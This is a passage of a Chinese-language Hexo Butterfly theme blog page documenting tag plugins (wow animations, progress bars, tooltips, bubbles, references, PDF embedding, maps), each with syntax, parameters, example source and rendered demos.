style="width:4em; height:4em" aria-hidden="true"><use xlink:href="#icon-dog"></use></svg></p><p><svg class="icon" style="width:5em; height:5em" aria-hidden="true"><use xlink:href="#icon-boar_hai"></use></svg><svg class="icon" style="width:6em; height:6em" aria-hidden="true"><use xlink:href="#icon-boar"></use></svg></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-24-特效标签wow">2.24 特效标签wow</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow [animete],[duration],[delay],[offset],[iteration] %&#125;</span><br><span class="line">内容</span><br><span class="line">&#123;% endwow %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>animate</code>: 动画样式，效果详见<a href="https://animate.style/">animate.css参考文档</a></li><li><code>duration</code>: 选填项，动画持续时间，单位可以是<code>ms</code>也可以是<code>s</code>。例如<code>3s</code>，<code>700ms</code>。</li><li><code>delay</code>: 选填项，动画开始的延迟时间，单位可以是<code>ms</code>也可以是<code>s</code>。例如<code>3s</code>，<code>700ms</code>。</li><li><code>offset</code>: 选填项，开始动画的距离（相对浏览器底部）</li><li><code>iteration</code>: 选填项，动画重复的次数</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.flip动画效果。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__zoomIn,5s,5s,100,10 %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note blue &#x27;fas fa-bullhorn&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`zoomIn`动画效果，持续`5s`，延时`5s`，离底部`100`距离时启动，重复`10`次</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure><p>2.zoomIn动画效果，持续5s，延时5s，离底部100距离时启动，重复10次</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__zoomIn,5s,5s,100,10 %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note blue &#x27;fas fa-bullhorn&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`zoomIn`动画效果，持续`5s`，延时`5s`，离底部`100`距离时启动，重复`10`次</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure><p>3.slideInRight动画效果，持续5s，延时5s</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__slideInRight,5s,5s %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note orange &#x27;fas fa-car&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`slideInRight`动画效果，持续`5s`，延时`5s`。</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure><p>4.heartBeat动画效果，延时5s，重复10次。此处注意不用的参数位置要留空，用逗号间隔。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__heartBeat,,5s,,10 %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note red &#x27;fas fa-battery-half&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`heartBeat`动画效果，延时`5s`，重复`10`次。</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.flip动画效果。</p><div class='wow animate__zoomIn' data-wow-duration='5s' data-wow-delay='5s' data-wow-offset='100'  data-wow-iteration='10' ><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p><code>zoomIn</code>动画效果，持续<code>5s</code>，延时<code>5s</code>，离底部<code>100</code>距离时启动，重复<code>10</code>次</p></div></div><p>2.zoomIn动画效果，持续5s，延时5s，离底部100距离时启动，重复10次</p><div class='wow animate__zoomIn' data-wow-duration='5s' data-wow-delay='5s' data-wow-offset='100'  data-wow-iteration='10' ><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p><code>zoomIn</code>动画效果，持续<code>5s</code>，延时<code>5s</code>，离底部<code>100</code>距离时启动，重复<code>10</code>次</p></div></div><p>3.slideInRight动画效果，持续5s，延时5s</p><div class='wow animate__slideInRight' data-wow-duration='5s' data-wow-delay='5s' data-wow-offset=''  data-wow-iteration='' ><div class="note orange icon-padding modern"><i class="note-icon fas fa-car"></i><p><code>slideInRight</code>动画效果，持续<code>5s</code>，延时<code>5s</code>。</p></div></div><p>4.heartBeat动画效果，延时5s，重复10次。此处注意不用的参数位置要留空，用逗号间隔。</p><div class='wow animate__heartBeat' data-wow-duration='' data-wow-delay='5s' data-wow-offset=''  data-wow-iteration='10' ><div class="note red icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p><code>heartBeat</code>动画效果，延时<code>5s</code>，重复<code>10</code>次。</p></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-25-进度条-progress">2.25  进度条 progress</h2><div class="note info flat"><p>进度条标签参考<a href="https://rongbuqiu.com/jdt.html">沂佰孜猫-给HEXO文章添加彩色进度条</a>。<br>源样式提取自<a href="https://zwying0814.gitbook.io/cuteen/">Cuteen</a>主题。</p></div><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-2">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% progress [width] [color] [text] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>width</code>: 0到100的阿拉伯数字</li><li><code>color</code>: 颜色，取值有red,yellow,green,cyan,blue,gray</li><li><code>text</code>:进度条上的文字内容</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% progress 10 red 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 30 yellow 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 50 green 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 70 cyan 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 90 blue 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 100 gray 进度条样式预览 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-red"  style="width: 10%" aria-valuenow="10" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-yellow"  style="width: 30%" aria-valuenow="30" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-green"  style="width: 50%" aria-valuenow="50" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-cyan"  style="width: 70%" aria-valuenow="70" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-blue"  style="width: 90%" aria-valuenow="90" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-gray"  style="width: 100%" aria-valuenow="100" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-26-注释-notation">2.26 注释 notation</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% nota [label] , [text] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><p><code>label</code>: 注释词汇</p></li><li><p><code>text</code>: 悬停显示的注解内容</p></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% nota 把鼠标移动到我上面试试 ,可以看到注解内容出现在顶栏 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p><span class='nota' data-nota='可以看到注解内容出现在顶栏'>把鼠标移动到我上面试试</span></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-27-气泡注释-bubble">2.27 气泡注释 bubble</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bubble [content] , [notation] ,[background-color] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>content</code>: 注释词汇</li><li><code>notation</code>: 悬停显示的注解内容</li><li><code>background-color</code>: 可选，气泡背景色。默认为“#71a4e3”</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">最近我学到了不少新玩意儿（虽然对很多大佬来说这些已经是旧技术了），比如CSS的&#123;% bubble 兄弟相邻选择器,&quot;例如 h1 + p &#123;margin-top:50px;&#125;&quot; %&#125;，&#123;% bubble flex布局,&quot;Flex 是 Flexible Box 的缩写，意为&quot;弹性布局&quot;，用来为盒状模型提供最大的灵活性&quot;,&quot;#ec5830&quot; %&#125;，&#123;% bubble transform变换,&quot;transform 属性向元素应用 2D 或 3D 转换。该属性允许我们对元素进行旋转、缩放、移动或倾斜。&quot;,&quot;#1db675&quot; %&#125;，animation的&#123;% bubble 贝塞尔速度曲线,&quot;贝塞尔曲线(Bézier curve)，又称贝兹曲线或贝济埃曲线，是应用于二维图形应用程序的数学曲线。一般的矢量图形软件通过它来精确画出曲线，贝兹曲线由线段与节点组成，节点是可拖动的支点，线段像可伸缩的皮筋&quot;,&quot;#de4489&quot; %&#125;写法，还有今天刚看到的&#123;% bubble clip-path,&quot;clip-path属性使用裁剪方式创建元素的可显示区域。区域内的部分显示，区域外的隐藏。&quot;,&quot;#868fd7&quot; %&#125;属性。这些对我来说很新颖的概念狠狠的冲击着我以前积累起来的设计思路。</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>最近我学到了不少新玩意儿（虽然对很多大佬来说这些已经是旧技术了），比如CSS的<span class="bubble-content">兄弟相邻选择器</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#71a4e3;">例如 h1 + p {margin-top:50px;}</span></span>，<span class="bubble-content">flex布局</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#ec5830;">Flex 是 Flexible Box 的缩写，意为弹性布局&quot;，用来为盒状模型提供最大的灵活性&quot;</span></span>，<span class="bubble-content">transform变换</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#1db675;">transform 属性向元素应用 2D 或 3D 转换。该属性允许我们对元素进行旋转、缩放、移动或倾斜。</span></span>，animation的<span class="bubble-content">贝塞尔速度曲线</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#de4489;">贝塞尔曲线(Bézier curve)，又称贝兹曲线或贝济埃曲线，是应用于二维图形应用程序的数学曲线。一般的矢量图形软件通过它来精确画出曲线，贝兹曲线由线段与节点组成，节点是可拖动的支点，线段像可伸缩的皮筋</span></span>写法，还有今天刚看到的<span class="bubble-content">clip-path</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#868fd7;">clip-path属性使用裁剪方式创建元素的可显示区域。区域内的部分显示，区域外的隐藏。</span></span>属性。这些对我来说很新颖的概念狠狠的冲击着我以前积累起来的设计思路。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-28-引用文献-reference">2.28 引用文献 reference</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% referto [id] , [literature] %&#125;</span><br><span class="line">&#123;% referfrom [id] , [literature] , [url] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><p>referto 引用上标</p><ul><li><p><code>id</code>: 上标序号内容，需与referfrom标签的id对应才能实现跳转</p></li><li><p><code>literature</code>: 引用的参考文献名称</p></li></ul></li><li><p>referfrom 引用出处</p><ul><li><p><code>id</code>: 序号内容，需与referto标签的id对应才能实现 跳转</p></li><li><p><code>literature</code>: 引用的参考文献名称</p></li><li><p><code>url</code>: 引用的参考文献链接，可省略</p></li></ul></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Akilarの糖果屋(akilar.top)是一个私人性质的博客&#123;% referto &#x27;[1]&#x27;,&#x27;Akilarの糖果屋群聊简介&#x27; %&#125;，从各类教程至生活点滴，无话不谈。建群的目的是提供一个闲聊的场所。博客采用Hexo框架&#123;% referto &#x27;[2]&#x27;,&#x27;Hexo中文文档&#x27; %&#125;，Butterfly主题&#123;% referto &#x27;[3]&#x27;,&#x27;Butterfly 安装文档(一) 快速开始&#x27; %&#125;</span><br><span class="line"></span><br><span class="line">本项目参考了Volantis&#123;% referto &#x27;[4]&#x27;,&#x27;hexo-theme-volantis 标签插件&#x27; %&#125;的标签样式。引入<span class="code">`[tag].js`</span>，并针对<span class="code">`butterfly`</span>主题修改了相应的<span class="code">`[tag].styl`</span>。在此鸣谢<span class="code">`Volantis`</span>主题众开发者。</span><br><span class="line">主要参考内容包括各个volantis的内置标签插件文档&#123;% referto &#x27;[5]&#x27;,&#x27;Volantis文档:内置标签插件&#x27; %&#125;</span><br><span class="line">Butterfly主题的各个衍生魔改&#123;% referto &#x27;[6]&#x27;,&#x27;Butterfly 安装文档:标签外挂（Tag Plugins&#x27; %&#125;&#123;% referto &#x27;[7]&#x27;,&#x27;小弋の生活馆全样式预览&#x27; %&#125;&#123;% referto &#x27;[8]&#x27;,&#x27;l-lin-font-awesome-animation&#x27; %&#125;&#123;% referto &#x27;[9]&#x27;,&#x27;小康的butterfly主题使用文档&#x27; %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% referfrom &#x27;[1]&#x27;,&#x27;Akilarの糖果屋群聊简介&#x27;,&#x27;https://jq.qq.com/?<span class="emphasis">_wv=1027&amp;k=pGLB2C0N&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[2]&#x27;,&#x27;Hexo中文文档&#x27;,&#x27;https://hexo.io/zh-cn/docs/&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[3]&#x27;,&#x27;Butterfly 安装文档(一) 快速开始&#x27;,&#x27;https://butterfly.js.org/posts/21cfbf15/&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[4]&#x27;,&#x27;hexo-theme-volantis 标签插件&#x27;,&#x27;https://volantis.js.org/v5/tag-plugins/&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[5]&#x27;,&#x27;Volantis文档:内置标签插件&#x27;,&#x27;https://volantis.js.org/tag-plugins/&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[6]&#x27;,&#x27;Butterfly 安装文档:标签外挂（Tag Plugins&#x27;,&#x27;https://butterfly.js.org/posts/4aa8abbe/#%E6%A8%99%E7%B1%A4%E5%A4%96%E6%8E%9B%EF%BC%88Tag-Plugins%EF%BC%89&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[7]&#x27;,&#x27;小弋の生活馆全样式预览&#x27;,&#x27;https://lovelijunyi.gitee.io/posts/c898.html&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[8]&#x27;,&#x27;l-lin-font-awesome-animation&#x27;,&#x27;https://github.com/l-lin/font-awesome-animation&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[9]&#x27;,&#x27;小康的butterfly主题使用文档&#x27;,&#x27;https://www.antmoe.com/posts/3b43914f/&#x27; %&#125;</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>Akilarの糖果屋(akilar.top)是一个私人性质的博客<span class="hidden-anchor" id="referto_[1]"></span><sup class="reference"><a href="#referfrom_[1]">[1]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Akilarの糖果屋群聊简介</span><span class="reference-title">参考资料</span></span></span>，从各类教程至生活点滴，无话不谈。建群的目的是提供一个闲聊的场所。博客采用Hexo框架<span class="hidden-anchor" id="referto_[2]"></span><sup class="reference"><a href="#referfrom_[2]">[2]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Hexo中文文档</span><span class="reference-title">参考资料</span></span></span>，Butterfly主题<span class="hidden-anchor" id="referto_[3]"></span><sup class="reference"><a href="#referfrom_[3]">[3]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Butterfly 安装文档(一) 快速开始</span><span class="reference-title">参考资料</span></span></span></p><p>本项目参考了Volantis<span class="hidden-anchor" id="referto_[4]"></span><sup class="reference"><a href="#referfrom_[4]">[4]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">hexo-theme-volantis 标签插件</span><span class="reference-title">参考资料</span></span></span>的标签样式。引入<code>[tag].js</code>，并针对<code>butterfly</code>主题修改了相应的<code>[tag].styl</code>。在此鸣谢<code>Volantis</code>主题众开发者。<br>主要参考内容包括各个volantis的内置标签插件文档<span class="hidden-anchor" id="referto_[5]"></span><sup class="reference"><a href="#referfrom_[5]">[5]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Volantis文档:内置标签插件</span><span class="reference-title">参考资料</span></span></span><br>Butterfly主题的各个衍生魔改<span class="hidden-anchor" id="referto_[6]"></span><sup class="reference"><a href="#referfrom_[6]">[6]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Butterfly 安装文档:标签外挂（Tag Plugins</span><span class="reference-title">参考资料</span></span></span><span class="hidden-anchor" id="referto_[7]"></span><sup class="reference"><a href="#referfrom_[7]">[7]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">小弋の生活馆全样式预览</span><span class="reference-title">参考资料</span></span></span><span class="hidden-anchor" id="referto_[8]"></span><sup class="reference"><a href="#referfrom_[8]">[8]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">l-lin-font-awesome-animation</span><span class="reference-title">参考资料</span></span></span><span class="hidden-anchor" id="referto_[9]"></span><sup class="reference"><a href="#referfrom_[9]">[9]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">小康的butterfly主题使用文档</span><span class="reference-title">参考资料</span></span></span></p><div class="reference-source"><span class="hidden-anchor" id="referfrom_[1]"></span><a class="reference-anchor" href="#referto_[1]">[1]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://jq.qq.com/?_wv=1027&k=pGLB2C0N">Akilarの糖果屋群聊简介</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[2]"></span><a class="reference-anchor" href="#referto_[2]">[2]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://hexo.io/zh-cn/docs/">Hexo中文文档</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[3]"></span><a class="reference-anchor" href="#referto_[3]">[3]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://butterfly.js.org/posts/21cfbf15/">Butterfly 安装文档(一) 快速开始</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[4]"></span><a class="reference-anchor" href="#referto_[4]">[4]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://volantis.js.org/v5/tag-plugins/">hexo-theme-volantis 标签插件</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[5]"></span><a class="reference-anchor" href="#referto_[5]">[5]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://volantis.js.org/tag-plugins/">Volantis文档:内置标签插件</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[6]"></span><a class="reference-anchor" href="#referto_[6]">[6]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://butterfly.js.org/posts/4aa8abbe/#%E6%A8%99%E7%B1%A4%E5%A4%96%E6%8E%9B%EF%BC%88Tag-Plugins%EF%BC%89">Butterfly 安装文档:标签外挂（Tag Plugins</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[7]"></span><a class="reference-anchor" href="#referto_[7]">[7]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://lovelijunyi.gitee.io/posts/c898.html">小弋の生活馆全样式预览</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[8]"></span><a class="reference-anchor" href="#referto_[8]">[8]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://github.com/l-lin/font-awesome-animation">l-lin-font-awesome-animation</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[9]"></span><a class="reference-anchor" href="#referto_[9]">[9]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://www.antmoe.com/posts/3b43914f/">小康的butterfly主题使用文档</a></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-29-PDF展示">2.29 PDF展示</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% pdf 文件路径 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>文件路径</code>: 可以是相对路径或者是在线链接</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 1.本地文件:在md文件路径下创建一个同名文件夹，其内放pdf文件名为xxx.pdf的文件</span></span><br><span class="line">&#123;% pdf xxx.pdf %&#125;</span><br><span class="line"><span class="section"># 2.在线链接</span></span><br><span class="line">&#123;% pdf https://cdn.jsdelivr.net/gh/Justlovesmile/CDN/pdf/小作文讲义.pdf %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>2.在线链接(要放到最外层才能起作用)</p><pre><code>&lt;div class=&quot;row&quot;&gt;&lt;embed src=&quot;https://cdn.jsdelivr.net/gh/Justlovesmile/CDN/pdf/小作文讲义.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pdf&quot;&gt;&lt;/div&gt;</code></pre><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-30-Hexo-tag-map-插件">2.30 Hexo-tag-map 插件</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% + 标签值 + 经度 + 纬度 + 文本 + 缩放等级 + 宽 + 高 + 默认图层 + %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><table><thead><tr><th style="text-align:center">地图名</th><th style="text-align:center">标签值 &lt;必填&gt;</th><th style="text-align:center">宽 (默认 100%) / 高 (默认 360px)</th><th style="text-align:center">缩放等级 (默认 14)</th><th style="text-align:center">宽 (默认 100%) / 高 (默认 360px)</th><th style="text-align:center">默认图层 (默认 1)</th></tr></thead><tbody><tr><td style="text-align:center">混合地图</td><td style="text-align:center">map</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 3~18</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~7</td></tr><tr><td style="text-align:center">谷歌地图</td><td style="text-align:center">googleMap</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~20</td><td 